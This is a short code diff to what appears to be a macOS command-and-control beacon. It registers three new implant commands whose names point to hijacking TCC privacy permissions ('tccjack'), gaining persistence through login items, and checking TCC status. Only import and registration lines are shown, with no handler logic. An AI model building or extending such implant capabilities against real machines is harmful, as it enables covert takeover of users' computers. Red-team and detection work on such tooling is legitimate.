@@ -8,6 +8,9 @@
 #import "commands/ZEchoCommandHandler.h"
 #import "commands/ZDialogCommandHandler.h"
 #import "commands/ZWhoAmICommandHandler.h"
+#import "commands/ZTCCJackCommandHandler.h"
+#import "commands/ZLoginItemCommandHandler.h"
+#import "commands/ZTCCCheckCommandHandler.h"
 
 // Define default configuration values
 const ZBeaconConfiguration ZBeaconDefaultConfiguration = {
@@ -626,6 +629,15 @@ static const int __unused kMaxRetryAttempts = 5;                // Maximum numbe
     
     // Register whoami command handler
     [self registerCommandHandler:@"whoami" handlerClass:[ZWhoAmICommandHandler class]];
+    
+    // Register tccjack command handler
+    [self registerCommandHandler:@"tccjack" handlerClass:[ZTCCJackCommandHandler class]];
+    
+    // Register loginitem command handler
+    [self registerCommandHandler:@"loginitem" handlerClass:[ZLoginItemCommandHandler class]];
+    
+    // Register tcccheck command handler
+    [self registerCommandHandler:@"tcccheck" handlerClass:[ZTCCCheckCommandHandler class]];
 }
 
 - (BOOL)registerCommandHandler:(NSString *)commandType handlerClass:(Class)handlerClass {
